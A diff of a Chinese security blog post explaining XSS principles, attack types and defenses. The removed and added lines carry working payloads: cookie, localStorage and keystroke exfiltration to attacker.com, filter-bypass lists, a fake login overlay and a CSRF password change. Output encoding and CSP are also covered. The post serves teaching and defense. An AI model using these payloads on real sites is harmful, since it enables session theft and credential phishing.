@@ -5,8 +5,8 @@
 <head>
     <meta charset="utf-8">
     <meta name="keywords" content="XSS 跨站脚本攻击：原理、攻击与防御, 是小竹不是小猪">
-    <meta name="description" content="一、XSS 的核心原理1.1 本质：数据与代码的边界混淆XSS（Cross-Site Scripting，跨站脚本攻击）的根本原因是用户可控数据被浏览器当作可执行代码解释。
-这与 SQL 注入的逻辑完全同构——SQL 注入是用户输入被数据库">
+    <meta name="description" content="一、核心原理XSS 的根本原因是用户可控数据被浏览器当作可执行代码解释。
+浏览器解析 HTML 时，遇到 &amp;lt;script&amp;gt; 标签、事件处理属性（onerror、onload）、javascript: 伪协议，会将其中的内容作为 ">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -476,393 +476,327 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h3 id="一、XSS-的核心原理"><a href="#一、XSS-的核心原理" class="headerlink" title="一、XSS 的核心原理"></a>一、XSS 的核心原理</h3><h4 id="1-1-本质：数据与代码的边界混淆"><a href="#1-1-本质：数据与代码的边界混淆" class="headerlink" title="1.1 本质：数据与代码的边界混淆"></a>1.1 本质：数据与代码的边界混淆</h4><p>XSS（Cross-Site Scripting，跨站脚本攻击）的根本原因是<strong>用户可控数据被浏览器当作可执行代码解释</strong>。</p>
-<p>这与 SQL 注入的逻辑完全同构——SQL 注入是用户输入被数据库引擎当作 SQL 指令执行，XSS 是用户输入被浏览器当作 JavaScript 执行。区别只在于执行环境不同：一个是数据库引擎，一个是浏览器渲染引擎。</p>
-<p>浏览器解析 HTML 时，遇到 <code>&lt;script&gt;</code> 标签、事件处理属性（<code>onerror</code>、<code>onload</code>）、<code>javascript:</code> 伪协议等，会将其中的内容作为代码执行。如果这些位置的内容来自用户输入且未经转义，攻击者就能注入任意 JavaScript 代码。</p>
-<h4 id="1-2-为什么-XSS-危险"><a href="#1-2-为什么-XSS-危险" class="headerlink" title="1.2 为什么 XSS 危险"></a>1.2 为什么 XSS 危险</h4><p>JavaScript 在浏览器中运行在同源策略（Same-Origin Policy）下，拥有对当前域名下 Cookie、localStorage、DOM 的完全访问权限。一段恶意脚本能做的事情包括：窃取 Cookie 和会话令牌、劫持用户操作（模拟点击、表单提交）、重定向到钓鱼页面、读取页面中的所有敏感数据（如银行卡号、个人信息）、利用用户身份调用后端 API。</p>
-<p>如果配合社工手段，XSS 的危害会被进一步放大——攻击者不需要直接攻击服务端，而是让受害者自己的浏览器成为攻击载体。</p>
+                <h3 id="一、核心原理"><a href="#一、核心原理" class="headerlink" title="一、核心原理"></a>一、核心原理</h3><p>XSS 的根本原因是<strong>用户可控数据被浏览器当作可执行代码解释</strong>。</p>
+<p>浏览器解析 HTML 时，遇到 <code>&lt;script&gt;</code> 标签、事件处理属性（<code>onerror</code>、<code>onload</code>）、<code>javascript:</code> 伪协议，会将其中的内容作为 JavaScript 执行。如果这些位置的内容来自用户输入且未经转义，攻击者就能注入任意代码。</p>
+<p>这与 SQL 注入的逻辑完全同构——SQL 注入是用户输入被数据库引擎当作 SQL 指令执行，XSS 是用户输入被浏览器当作 JavaScript 执行。区别只在于执行环境不同。</p>
+<p>JavaScript 在同源策略下拥有对当前域名 Cookie、localStorage、DOM 的完全访问权限。一段恶意脚本能窃取会话、劫持操作、读取页面敏感数据、以用户身份调用后端 API。</p>
 <hr>
-<h3 id="二、XSS-的三种类型"><a href="#二、XSS-的三种类型" class="headerlink" title="二、XSS 的三种类型"></a>二、XSS 的三种类型</h3><h4 id="2-1-反射型-XSS（Reflected）"><a href="#2-1-反射型-XSS（Reflected）" class="headerlink" title="2.1 反射型 XSS（Reflected）"></a>2.1 反射型 XSS（Reflected）</h4><p>恶意脚本出现在 HTTP 请求中（URL 参数、表单字段），服务端将其原样返回到响应页面里，浏览器解析时执行。</p>
-<p>典型场景：搜索框回显用户输入。</p>
-<pre><code>https://example.com/search?q=&lt;script&gt;document.location=&#39;https://attacker.com/steal?c=&#39;+document.cookie&lt;/script&gt;
+<h3 id="二、三种-XSS-完整攻击实例"><a href="#二、三种-XSS-完整攻击实例" class="headerlink" title="二、三种 XSS 完整攻击实例"></a>二、三种 XSS 完整攻击实例</h3><p>下面每种类型只讲一个完整场景，从发现漏洞到最终利用，走完全流程。</p>
+<h4 id="2-1-反射型-XSS：搜索框回显"><a href="#2-1-反射型-XSS：搜索框回显" class="headerlink" title="2.1 反射型 XSS：搜索框回显"></a>2.1 反射型 XSS：搜索框回显</h4><p><strong>场景：</strong> 一个电商网站的搜索功能，URL 为 <code>https://shop.com/search?q=手机壳</code>，页面将搜索词回显在结果区域。</p>
+<p><strong>第一步：找到注入点。</strong> 访问 <code>https://shop.com/search?q=test</code>，页面源码中出现：</p>
+<pre><code class="html">&lt;div class=&quot;search-result&quot;&gt;
+  &lt;p&gt;您搜索的关键词是：test&lt;/p&gt;
+  ...
+&lt;/div&gt;
 </code></pre>
-<p>服务端如果直接将 <code>q</code> 参数的值拼入 HTML：</p>
-<pre><code class="php">// 危险写法
-echo &quot;&lt;div class=&#39;result&#39;&gt;搜索结果：&quot; . $_GET[&#39;q&#39;] . &quot;&lt;/div&gt;&quot;;
+<p>服务端代码大致如下：</p>
+<pre><code class="php">$keyword = $_GET[&#39;q&#39;];
+echo &quot;&lt;p&gt;您搜索的关键词是：&quot; . $keyword . &quot;&lt;/p&gt;&quot;;
 </code></pre>
-<p>浏览器渲染时，<code>&lt;script&gt;</code> 标签被执行，Cookie 被发送到攻击者服务器。</p>
-<p>反射型 XSS 的特点是<strong>非持久化</strong>——恶意脚本不存储在服务端，每次都需要诱导用户点击包含恶意参数的链接。攻击面在于 URL 参数被回显到页面的所有位置。</p>
-<h4 id="2-2-存储型-XSS（Stored-Persistent）"><a href="#2-2-存储型-XSS（Stored-Persistent）" class="headerlink" title="2.2 存储型 XSS（Stored / Persistent）"></a>2.2 存储型 XSS（Stored / Persistent）</h4><p>恶意脚本被存储在服务端（数据库、文件系统），当其他用户访问包含该数据的页面时自动执行。</p>
-<p>典型场景：评论区、个人简介、帖子内容、文件名展示。</p>
-<pre><code class="html">&lt;!-- 攻击者在评论区提交 --&gt;
-&lt;img src=x onerror=&quot;fetch(&#39;https://attacker.com/steal?c=&#39;+document.cookie)&quot;&gt;
+<p>用户输入被直接拼入 HTML，没有任何转义。</p>
+<p><strong>第二步：测试注入。</strong> 访问 <code>https://shop.com/search?q=&lt;script&gt;alert(1)&lt;/script&gt;</code>，页面弹出了 alert 框。确认漏洞存在。</p>
+<p><strong>第三步：构造攻击链接。</strong> 攻击者编写一个窃取 Cookie 的脚本，部署在 <code>https://attacker.com/steal.js</code>：</p>
+<pre><code class="javascript">// steal.js
+new Image().src = &#39;https://attacker.com/log?cookie=&#39; + encodeURIComponent(document.cookie);
 </code></pre>
-<p>这条评论被存入数据库。当其他用户浏览该页面时，服务端从数据库取出评论内容拼入 HTML，浏览器解析到 <code>&lt;img&gt;</code> 标签的 <code>onerror</code> 事件，脚本执行。</p>
-<p>存储型 XSS 的危害远大于反射型，因为攻击者只需注入一次，所有访问该页面的用户都会中招。</p>
-<h4 id="2-3-DOM-型-XSS（DOM-based）"><a href="#2-3-DOM-型-XSS（DOM-based）" class="headerlink" title="2.3 DOM 型 XSS（DOM-based）"></a>2.3 DOM 型 XSS（DOM-based）</h4><p>与前两种不同，DOM 型 XSS 的漏洞 entirely 发生在客户端。恶意数据从 DOM 中读取（如 <code>location.hash</code>、<code>document.referrer</code>、<code>window.name</code>），未经转义直接写入页面（如 <code>innerHTML</code>、<code>document.write</code>）。</p>
-<pre><code class="javascript">// 危险写法
-const hash = location.hash.slice(1);
-document.getElementById(&#39;content&#39;).innerHTML = decodeURIComponent(hash);
+<p>攻击链接为：</p>
+<pre><code>https://shop.com/search?q=&lt;script src=&quot;https://attacker.com/steal.js&quot;&gt;&lt;/script&gt;
 </code></pre>
-<p>攻击者构造 URL：<code>https://example.com/page#&lt;img src=x onerror=alert(1)&gt;</code></p>
-<p>这段代码从 <code>location.hash</code> 取出用户输入，直接赋给 <code>innerHTML</code>，浏览器解析并执行。整个过程中恶意数据从未到达服务端，所以传统的服务端 WAF 无法检测。</p>
-<p>DOM 型 XSS 的 sink（危险操作）常见的有：<code>innerHTML</code>、<code>outerHTML</code>、<code>document.write</code>、<code>document.writeln</code>、<code>eval</code>、<code>setTimeout</code>（字符串参数）、<code>new Function</code>。source（数据来源）常见的有：<code>location.hash</code>、<code>location.search</code>、<code>document.referrer</code>、<code>window.name</code>、<code>postMessage</code>。</p>
+<p><strong>第四步：社工投递。</strong> 攻击者通过邮件、论坛消息、群聊将这个链接发给目标用户。用户点击后，浏览器加载 shop.com 页面，页面中的 <code>&lt;script&gt;</code> 标签加载了攻击者的 JS，攻击者的 JS 在 shop.com 的上下文中执行，读取到 shop.com 的 Cookie 并发送到 attacker.com。</p>
+<p><strong>完整数据流：</strong></p>
+<pre><code>用户点击恶意链接
+  → 浏览器请求 shop.com/search?q=&lt;script src=attacker.com/steal.js&gt;
+  → shop.com 返回 HTML，其中包含未转义的 &lt;script&gt; 标签
+  → 浏览器解析 HTML，加载并执行 attacker.com/steal.js
+  → steal.js 读取 document.cookie（shop.com 域下的 Cookie）
+  → steal.js 创建 &lt;img&gt; 标签，src 指向 attacker.com/log?cookie=xxx
+  → 攻击者服务器收到 Cookie
+</code></pre>
+<p><strong>为什么这能成功？</strong> 因为浏览器对 shop.com 返回的所有内容一视同仁地解析执行，它无法区分”shop.com 自己写的脚本”和”通过注入进来的脚本”。反射型 XSS 的本质就是攻击者借 shop.com 的嘴，对用户的浏览器说了假话。</p>
+<h4 id="2-2-存储型-XSS：评论区注入"><a href="#2-2-存储型-XSS：评论区注入" class="headerlink" title="2.2 存储型 XSS：评论区注入"></a>2.2 存储型 XSS：评论区注入</h4><p><strong>场景：</strong> 一个论坛系统，用户可以发帖和评论。评论存入数据库，展示时从数据库取出拼入 HTML。</p>
+<p><strong>第一步：注入恶意评论。</strong> 攻击者注册账号，在任意帖子下发表评论：</p>
+<pre><code>这帖子写得真好！&lt;img src=x onerror=&quot;fetch(&#39;https://attacker.com/hook&#39;,&#123;method:&#39;POST&#39;,body:JSON.stringify(&#123;url:location.href,cookie:document.cookie,localStorage:Object.entries(localStorage).reduce((a,[k,v])=&gt;(a[k]=v,a),&#123;&#125;)&#125;)&#125;)&quot;&gt;
+</code></pre>
+<p>这条评论被存入数据库。注意这里没有用 <code>&lt;script&gt;</code> 标签，而是用 <code>&lt;img&gt;</code> 的 <code>onerror</code> 事件——因为很多系统会过滤 <code>&lt;script&gt;</code> 但忘记过滤事件属性。</p>
+<p><strong>第二步：等待受害者。</strong> 其他用户浏览该帖子，服务端从数据库取出评论，拼入页面：</p>
+<pre><code class="html">&lt;div class=&quot;comment&quot;&gt;
+  &lt;span class=&quot;author&quot;&gt;attacker&lt;/span&gt;
+  &lt;p&gt;这帖子写得真好！&lt;img src=x onerror=&quot;fetch(&#39;https://attacker.com/hook&#39;,...)&quot;&gt;&lt;/p&gt;
+&lt;/div&gt;
+</code></pre>
+<p><strong>第三步：自动执行。</strong> 浏览器解析到 <code>&lt;img src=x&gt;</code>，尝试加载图片 <code>x</code>，加载失败触发 <code>onerror</code> 事件，其中的 JavaScript 执行。脚本将当前页面的 URL、Cookie、localStorage 全部发送到 attacker.com。</p>
+<p><strong>完整数据流：</strong></p>
+<pre><code>攻击者提交恶意评论
+  → 评论存入数据库（包含 &lt;img onerror=...&gt;）
+  → 受害者访问帖子页面
+  → 服务端从数据库取评论，拼入 HTML 返回
+  → 浏览器解析 HTML，遇到 &lt;img src=x&gt;
+  → 图片加载失败，触发 onerror
+  → onerror 中的 JS 执行，将 Cookie/localStorage 发送到 attacker.com
+</code></pre>
+<p><strong>与反射型的关键区别：</strong> 攻击者只需注入一次，不需要诱导每个受害者点击特定链接。所有访问该帖子的人都会中招。这就是存储型 XSS 危害更大的原因。</p>
+<p><strong>实际案例参考：</strong> 2018 年某社交平台曾出现存储型 XSS，攻击者在个人签名中注入 <code>&lt;img onerror=...&gt;</code>，任何查看其个人资料的用户都会被窃取会话。</p>
+<h4 id="2-3-DOM-型-XSS：前端路由参数"><a href="#2-3-DOM-型-XSS：前端路由参数" class="headerlink" title="2.3 DOM 型 XSS：前端路由参数"></a>2.3 DOM 型 XSS：前端路由参数</h4><p><strong>场景：</strong> 一个单页应用（SPA），使用 hash 路由，页面中有一段代码根据 URL hash 显示当前板块名称。</p>
+<p><strong>第一步：找到危险 sink。</strong> 页面 JS 代码如下：</p>
+<pre><code class="javascript">// 从 URL hash 中取板块名，显示在页面上
+function renderSection() &#123;
+  const section = decodeURIComponent(location.hash.slice(1));
+  document.getElementById(&#39;section-title&#39;).innerHTML = section;
+&#125;
+window.addEventListener(&#39;hashchange&#39;, renderSection);
+renderSection();
+</code></pre>
+<p>数据来源（source）是 <code>location.hash</code>，危险操作（sink）是 <code>innerHTML</code>。整条链路完全在客户端完成，恶意数据从未到达服务端。</p>
+<p><strong>第二步：构造 payload。</strong> 访问：</p>
+<pre><code>https://spa.com/#&lt;img src=x onerror=alert(document.cookie)&gt;
+</code></pre>
+<p><code>location.hash</code> 的值为 <code>#&lt;img src=x onerror=alert(document.cookie)&gt;</code>，<code>slice(1)</code> 去掉 <code>#</code>，<code>decodeURIComponent</code> 解码后赋值给 <code>innerHTML</code>。浏览器解析 innerHTML 中的 HTML 标签，<code>&lt;img&gt;</code> 触发 <code>onerror</code>。</p>
+<p><strong>第三步：利用。</strong> 实际攻击中，攻击者可以构造更复杂的 payload：</p>
+<pre><code>https://spa.com/#&lt;img src=x onerror=&quot;fetch(&#39;https://attacker.com/hook&#39;,&#123;method:&#39;POST&#39;,body:document.cookie&#125;)&quot;&gt;
+</code></pre>
+<p><strong>完整数据流：</strong></p>
+<pre><code>用户访问恶意 URL
+  → 浏览器加载 spa.com 页面
+  → 页面 JS 执行 renderSection()
+  → location.hash 取出 &quot;#&lt;img src=x onerror=...&gt;&quot;
+  → decodeURIComponent 解码
+  → 赋值给 innerHTML
+  → 浏览器解析 innerHTML 中的 HTML
+  → &lt;img&gt; 触发 onerror，JS 执行
+  → Cookie 被发送到 attacker.com
+</code></pre>
+<p><strong>为什么 WAF 防不住？</strong> 因为恶意数据从未经过服务端——它完全存在于 URL 的 hash 部分（<code>#</code> 后面的内容），浏览器发送 HTTP 请求时根本不会把 hash 发给服务器。传统 WAF 检查的是 HTTP 请求内容，自然看不到。</p>
+<p><strong>DOM 型 XSS 的常见 source 和 sink：</strong></p>
+<p>source（数据来源）：<code>location.hash</code>、<code>location.search</code>、<code>document.referrer</code>、<code>window.name</code>、<code>postMessage</code> 的 data。</p>
+<p>sink（危险操作）：<code>innerHTML</code>、<code>outerHTML</code>、<code>document.write</code>、<code>document.writeln</code>、<code>eval</code>、<code>setTimeout</code>（字符串参数）、<code>new Function</code>。</p>
+<p>只要数据从 source 流到 sink 的过程中没有经过转义，就存在 DOM 型 XSS。</p>
 <hr>
-<h3 id="三、攻击手段全景"><a href="#三、攻击手段全景" class="headerlink" title="三、攻击手段全景"></a>三、攻击手段全景</h3><h4 id="3-1-注入点与-Payload-形态"><a href="#3-1-注入点与-Payload-形态" class="headerlink" title="3.1 注入点与 Payload 形态"></a>3.1 注入点与 Payload 形态</h4><p><strong>3.1.1 HTML 标签内注入</strong></p>
-<p>当用户输入被插入到 HTML 标签之间（如 <code>&lt;p&gt;用户输入&lt;/p&gt;</code>），攻击者需要闭合当前标签或引入新标签：</p>
-<pre><code class="html">&lt;!-- 原始页面 --&gt;
-&lt;p&gt;搜索结果：用户输入&lt;/p&gt;
-
-&lt;!-- 攻击者输入 --&gt;
-&lt;/p&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;p&gt;
-
-&lt;!-- 渲染结果 --&gt;
-&lt;p&gt;搜索结果：&lt;/p&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;p&gt;&lt;/p&gt;
+<h3 id="三、防御策略详解"><a href="#三、防御策略详解" class="headerlink" title="三、防御策略详解"></a>三、防御策略详解</h3><h4 id="3-1-输出编码：根据上下文选对编码函数"><a href="#3-1-输出编码：根据上下文选对编码函数" class="headerlink" title="3.1 输出编码：根据上下文选对编码函数"></a>3.1 输出编码：根据上下文选对编码函数</h4><p>输出编码是 XSS 防御的基石。原理很简单：将特殊字符转换为它们在对应上下文中不具备语法含义的表示形式。</p>
+<p>关键认知：<strong>不存在一种通用的”XSS 过滤”，因为 HTML 的不同位置有不同的语法规则。</strong> 同一段用户输入，插入到 HTML 标签之间和插入到 JS 字符串中，需要完全不同的编码方式。</p>
+<p><strong>场景一：数据插入 HTML 标签之间</strong></p>
+<pre><code class="html">&lt;p&gt;用户输入在这里&lt;/p&gt;
 </code></pre>
-<p><strong>3.1.2 HTML 属性内注入</strong></p>
-<p>当用户输入被放入属性值（如 <code>&lt;img src=&quot;用户输入&quot;&gt;</code>），攻击者需要闭合属性值和标签：</p>
-<pre><code class="html">&lt;!-- 原始页面 --&gt;
-&lt;img src=&quot;用户输入&quot; alt=&quot;avatar&quot;&gt;
-
-&lt;!-- 攻击者输入 --&gt;
-&quot; onerror=&quot;alert(1)&quot; x=&quot;
-
-&lt;!-- 渲染结果 --&gt;
-&lt;img src=&quot;&quot; onerror=&quot;alert(1)&quot; x=&quot;&quot; alt=&quot;avatar&quot;&gt;
-</code></pre>
-<p><strong>3.1.3 JavaScript 代码块内注入</strong></p>
-<p>当用户输入被嵌入到 <code>&lt;script&gt;</code> 标签内的 JS 代码中：</p>
-<pre><code class="html">&lt;script&gt;
-  var userName = &quot;用户输入&quot;;
-&lt;/script&gt;
-</code></pre>
-<p>攻击者输入 <code>&quot;; alert(document.cookie); //</code>：</p>
-<pre><code class="html">&lt;script&gt;
-  var userName = &quot;&quot;; alert(document.cookie); //&quot;;
-&lt;/script&gt;
-</code></pre>
-<p>双引号闭合了字符串字面量，后面的代码被当作新的 JS 语句执行。</p>
-<p>如果输入被放入单引号字符串，攻击者用 <code>&#39;; alert(1); //&#39;</code> 即可。如果没有引号包裹（如 <code>var x = 用户输入;</code>），攻击者可以直接输入 <code>alert(1);//</code>。</p>
-<p><strong>3.1.4 特殊上下文注入</strong></p>
-<p>某些 HTML 属性天然具有代码执行能力：</p>
-<pre><code class="html">&lt;!-- href 属性 --&gt;
-&lt;a href=&quot;用户输入&quot;&gt;点击&lt;/a&gt;
-&lt;!-- 攻击者输入：javascript:alert(1) --&gt;
-
-&lt;!-- style 属性（IE 低版本） --&gt;
-&lt;div style=&quot;background:url(用户输入)&quot;&gt;
-&lt;!-- 攻击者输入：javascript:alert(1) --&gt;
-
-&lt;!-- src/iframe 属性 --&gt;
-&lt;iframe src=&quot;用户输入&quot;&gt;&lt;/iframe&gt;
-&lt;!-- 攻击者输入：javascript:alert(1) --&gt;
-</code></pre>
-<h4 id="3-2-绕过过滤的常见技巧"><a href="#3-2-绕过过滤的常见技巧" class="headerlink" title="3.2 绕过过滤的常见技巧"></a>3.2 绕过过滤的常见技巧</h4><p><strong>3.2.1 大小写混合</strong></p>
-<pre><code class="html">&lt;ScRiPt&gt;alert(1)&lt;/ScRiPt&gt;
-&lt;ImG sRc=x OnErRoR=alert(1)&gt;
-</code></pre>
-<p>如果过滤逻辑只匹配小写 <code>&lt;script&gt;</code>，大小写混合即可绕过。</p>
-<p><strong>3.2.2 编码绕过</strong></p>
-<p>HTML 实体编码、URL 编码、Unicode 编码、Base64 编码，不同上下文有不同的解码时机：</p>
-<pre><code class="html">&lt;!-- HTML 实体编码 --&gt;
-&lt;img src=x onerror=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&quot;&gt;
-
-&lt;!-- URL 编码（在 href 中） --&gt;
-&lt;a href=&quot;javascript&amp;#x3A;alert(1)&quot;&gt;click&lt;/a&gt;
-
-&lt;!-- Unicode 转义（在 JS 字符串中） --&gt;
-&lt;script&gt;var x = &quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;&lt;/script&gt;
-</code></pre>
-<p><strong>3.2.3 利用不常见的标签和事件</strong></p>
-<pre><code class="html">&lt;!-- SVG 标签 --&gt;
-&lt;svg onload=alert(1)&gt;
-&lt;svg/onload=alert(1)&gt;
-
-&lt;!-- Body 标签 --&gt;
-&lt;body onload=alert(1)&gt;
-
-&lt;!-- Input 标签 --&gt;
-&lt;input onfocus=alert(1) autofocus&gt;
-
-&lt;!-- Details 标签 --&gt;
-&lt;details open ontoggle=alert(1)&gt;
-
-&lt;!-- Marquee 标签 --&gt;
-&lt;marquee onstart=alert(1)&gt;
-
-&lt;!-- Video/Audio 标签 --&gt;
-&lt;video src=x onerror=alert(1)&gt;
-</code></pre>
-<p><strong>3.2.4 双写绕过</strong></p>
-<p>如果过滤逻辑只删除一次关键字（如将 <code>&lt;script&gt;</code> 替换为空），攻击者输入 <code>&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;/script&gt;ipt&gt;</code>，删除内层后剩下 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>。</p>
-<p><strong>3.2.5 利用注释和换行</strong></p>
-<pre><code class="html">&lt;script&gt;
-// 如果过滤了 &lt;script&gt;，但没过滤 &lt;/script&gt; 后的内容
-&lt;/script&gt; 后面的内容在某些解析器中仍可能被执行
-</code></pre>
-<p><strong>3.2.6 利用浏览器解析差异</strong></p>
-<p>不同浏览器对 HTML 的容错解析行为不同。例如，某些浏览器会自动补全未闭合的标签，或者对嵌套关系有不同的理解。攻击者可以利用这些差异构造只在特定浏览器中触发的 payload。</p>
-<h4 id="3-3-高级攻击场景"><a href="#3-3-高级攻击场景" class="headerlink" title="3.3 高级攻击场景"></a>3.3 高级攻击场景</h4><p><strong>3.3.1 XSS 窃取 Cookie 和 Session</strong></p>
-<pre><code class="javascript">new Image().src = &#39;https://attacker.com/steal?cookie=&#39; + encodeURIComponent(document.cookie);
-</code></pre>
-<p>利用 <code>&lt;img&gt;</code> 标签发起 GET 请求，将 Cookie 作为 URL 参数发送到攻击者服务器。这种方式不会在页面上留下可见痕迹。</p>
-<p><strong>3.3.2 XSS 劫持用户操作（BeEF 框架思路）</strong></p>
-<pre><code class="javascript">// 拦截所有表单提交，注入隐藏字段
-document.querySelectorAll(&#39;form&#39;).forEach(form =&gt; &#123;
-  form.addEventListener(&#39;submit&#39;, function(e) &#123;
-    e.preventDefault();
-    // 将表单数据发送到攻击者服务器
-    fetch(&#39;https://attacker.com/hook&#39;, &#123;
-      method: &#39;POST&#39;,
-      body: new FormData(form)
-    &#125;);
-    // 然后正常提交
-    form.submit();
-  &#125;);
-&#125;);
-</code></pre>
-<p><strong>3.3.3 XSS + CSRF 组合攻击</strong></p>
-<pre><code class="javascript">// 利用用户的登录态，以用户身份发起 POST 请求修改密码
-fetch(&#39;https://example.com/api/change-password&#39;, &#123;
-  method: &#39;POST&#39;,
-  headers: &#123; &#39;Content-Type&#39;: &#39;application/json&#39; &#125;,
-  credentials: &#39;include&#39;,  // 携带 Cookie
-  body: JSON.stringify(&#123; newPassword: &#39;attacker_password&#39; &#125;)
-&#125;);
-</code></pre>
-<p><code>credentials: &#39;include&#39;</code> 确保请求携带目标域的 Cookie，后端无法区分这是用户主动操作还是 XSS 发起的请求。</p>
-<p><strong>3.3.4 XSS 键盘记录</strong></p>
-<pre><code class="javascript">document.addEventListener(&#39;keypress&#39;, function(e) &#123;
-  new Image().src = &#39;https://attacker.com/key?k=&#39; + encodeURIComponent(e.key);
-&#125;);
-</code></pre>
-<p>监听全局键盘事件，将每次按键发送到攻击者服务器。可以窃取用户在页面上输入的所有内容，包括密码。</p>
-<p><strong>3.3.5 利用 XSS 进行钓鱼</strong></p>
-<pre><code class="javascript">// 覆盖页面内容，伪造登录框
-document.body.innerHTML = `
-  &lt;div style=&quot;position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999&quot;&gt;
-    &lt;h2&gt;会话已过期，请重新登录&lt;/h2&gt;
-    &lt;form action=&quot;https://attacker.com/phish&quot; method=&quot;POST&quot;&gt;
-      &lt;input name=&quot;username&quot; placeholder=&quot;用户名&quot;&gt;&lt;br&gt;
-      &lt;input name=&quot;password&quot; type=&quot;password&quot; placeholder=&quot;密码&quot;&gt;&lt;br&gt;
-      &lt;button type=&quot;submit&quot;&gt;登录&lt;/button&gt;
-    &lt;/form&gt;
-  &lt;/div&gt;
-`;
-</code></pre>
-<p>用户看到的是一个逼真的”重新登录”弹窗，输入的凭据直接发送到攻击者服务器。</p>
-<p><strong>3.3.6 利用 <code>postMessage</code> 跨域通信</strong></p>
-<p>如果页面监听了 <code>message</code> 事件但没有校验 <code>origin</code>：</p>
-<pre><code class="javascript">// 目标页面的危险代码
-window.addEventListener(&#39;message&#39;, function(e) &#123;
-  document.getElementById(&#39;output&#39;).innerHTML = e.data;
-&#125;);
-
-// 攻击者在自己的页面上
-&lt;iframe src=&quot;https://target.com/vulnerable-page&quot;&gt;&lt;/iframe&gt;
-&lt;script&gt;
-  document.querySelector(&#39;iframe&#39;).contentWindow.postMessage(&#39;&lt;img src=x onerror=alert(1)&gt;&#39;, &#39;*&#39;);
-&lt;/script&gt;
-</code></pre>
-<hr>
-<h3 id="四、防御策略"><a href="#四、防御策略" class="headerlink" title="四、防御策略"></a>四、防御策略</h3><h4 id="4-1-输出编码（最核心的防御）"><a href="#4-1-输出编码（最核心的防御）" class="headerlink" title="4.1 输出编码（最核心的防御）"></a>4.1 输出编码（最核心的防御）</h4><p>XSS 的本质是数据被当作代码执行，所以防御的核心是<strong>在数据插入 HTML 的位置做对应的编码</strong>，确保数据始终被当作数据处理。</p>
-<p>不同上下文需要不同的编码方式：</p>
-<p><strong>HTML 标签之间（HTML Context）：</strong> 编码 <code>&amp; &lt; &gt; &quot; &#39;</code></p>
-<pre><code class="java">// Java: 使用 OWASP Java Encoder
+<p>需要编码的字符：<code>&amp;</code> → <code>&amp;amp;</code>、<code>&lt;</code> → <code>&amp;lt;</code>、<code>&gt;</code> → <code>&amp;gt;</code>、<code>&quot;</code> → <code>&amp;quot;</code>、<code>&#39;</code> → <code>&amp;#x27;</code>。</p>
+<pre><code class="java">// Java: OWASP Java Encoder
 String safe = Encode.forHtml(userInput);
-// &amp; → &amp;amp;  &lt; → &amp;lt;  &gt; → &amp;gt;  &quot; → &amp;quot;  &#39; → &amp;#x27;
+// 输入: &lt;script&gt;alert(1)&lt;/script&gt;
+// 输出: &amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;
+// 浏览器渲染为纯文本，不会执行
 </code></pre>
-<pre><code class="python"># Python: 使用 markupsafe
+<pre><code class="python"># Python: markupsafe
 from markupsafe import escape
 safe = escape(user_input)
 </code></pre>
 <pre><code class="php">// PHP
 $safe = htmlspecialchars($userInput, ENT_QUOTES | ENT_HTML5, &#39;UTF-8&#39;);
 </code></pre>
-<p><strong>HTML 属性值内（Attribute Context）：</strong> 除了上述字符，还需要编码更多特殊字符</p>
+<p>编码后 <code>&lt;script&gt;</code> 变成了 <code>&amp;lt;script&amp;gt;</code>，浏览器看到 <code>&amp;lt;</code> 知道这是文本内容中的字符，不会当作标签解析。</p>
+<p><strong>场景二：数据插入 HTML 属性值内</strong></p>
+<pre><code class="html">&lt;input value=&quot;用户输入在这里&quot;&gt;
+</code></pre>
+<p>除了上述字符，还需要确保用户输入不能闭合属性值的引号。如果只编码 <code>&lt;</code> <code>&gt;</code> 而不编码 <code>&quot;</code>，攻击者输入 <code>&quot; onclick=&quot;alert(1)</code> 就能逃出属性：</p>
+<pre><code class="html">&lt;!-- 未编码引号 --&gt;
+&lt;input value=&quot;&quot; onclick=&quot;alert(1)&quot;&quot;&gt;
+</code></pre>
 <pre><code class="java">String safe = Encode.forHtmlAttribute(userInput);
+// 额外编码 &quot; &#39; 等可能闭合属性的字符
 </code></pre>
-<p><strong>JavaScript 代码块内（JS Context）：</strong> 需要编码为 JS 字符串安全字符</p>
-<pre><code class="java">String safe = Encode.forJavaScript(userInput);
-// 编码 \xHH 形式，确保不会闭合字符串字面量
-</code></pre>
-<p><strong>URL 参数中（URL Context）：</strong></p>
-<pre><code class="java">String safe = Encode.forUriComponent(userInput);
-</code></pre>
-<p><strong>CSS 值内（CSS Context）：</strong></p>
-<pre><code class="java">String safe = Encode.forCssString(userInput);
-</code></pre>
-<p>核心原则：<strong>根据数据插入的位置选择对应的编码函数，不存在一种通用的编码适用于所有上下文。</strong></p>
-<h4 id="4-2-Content-Security-Policy（CSP）"><a href="#4-2-Content-Security-Policy（CSP）" class="headerlink" title="4.2 Content Security Policy（CSP）"></a>4.2 Content Security Policy（CSP）</h4><p>CSP 是浏览器层面的第二道防线，通过 HTTP 响应头告诉浏览器哪些来源的脚本可以执行：</p>
-<pre><code>Content-Security-Policy: default-src &#39;self&#39;; script-src &#39;self&#39; https://cdn.example.com; object-src &#39;none&#39;; base-uri &#39;self&#39;
-</code></pre>
-<p>这条策略的含义：默认只允许加载同源资源；脚本只能从同源和 <code>cdn.example.com</code> 加载；禁止 <code>&lt;object&gt;</code>、<code>&lt;embed&gt;</code> 标签；<code>&lt;base&gt;</code> 标签只能指向同源。</p>
-<p>CSP 的关键价值在于：即使存在 XSS 注入点，如果 CSP 禁止了内联脚本（<code>unsafe-inline</code>）且没有可被利用的脚本源，攻击者也无法执行任意代码。</p>
-<p><strong>CSP 的演进：</strong></p>
-<ul>
-<li>CSP Level 1：<code>unsafe-inline</code> 仍可被绕过，<code>nonce</code> 和 <code>hash</code> 机制引入</li>
